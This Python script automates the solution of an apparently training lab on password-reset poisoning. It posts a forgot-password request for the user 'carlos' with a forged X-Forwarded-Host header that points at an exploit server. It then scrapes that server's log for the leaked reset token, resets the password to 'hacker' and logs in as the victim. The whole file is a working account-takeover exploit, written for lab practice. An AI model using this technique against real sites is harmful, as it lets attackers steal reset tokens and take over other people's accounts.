import requests
import re
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.exploit_server_url = None
        self.reset_password_link = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def get_exploit_server_url(self):
        response = self.session.get(self.lab_url)
        self.exploit_server_url = re.search(r'href=\'(https://exploit-.*?)\'', response.text).group(1)

    def forget_carlos_password(self):
        data = {
            'username': 'carlos'
        }
        headers = {
            'X-Forwarded-Host': self.exploit_server_url.replace('https://', '').rstrip('/')
        }
        self.session.post(self.lab_url + 'forgot-password', data=data, headers=headers)

    def get_logs(self):
        response = self.session.get(self.exploit_server_url + '/log')
        self.reset_password_link = re.findall(r'(forgot-password\?temp-forgot-password-token=.*) HTTP', response.text)[-1]

    def reset_carlos_password(self):
        data = {
            'temp-forgot-password-token': self.reset_password_link.split('=')[1],
            'new-password-1': 'hacker',
            'new-password-2': 'hacker'
        }
        self.session.post(self.lab_url + self.reset_password_link, data=data)

    def sing_in_as_carlos(self):
        data = {
            'username': 'carlos',
            'password': 'hacker'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_exploit_server_url()
        self.forget_carlos_password()
        time.sleep(10)
        self.get_logs()
        self.reset_carlos_password()
        self.sing_in_as_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
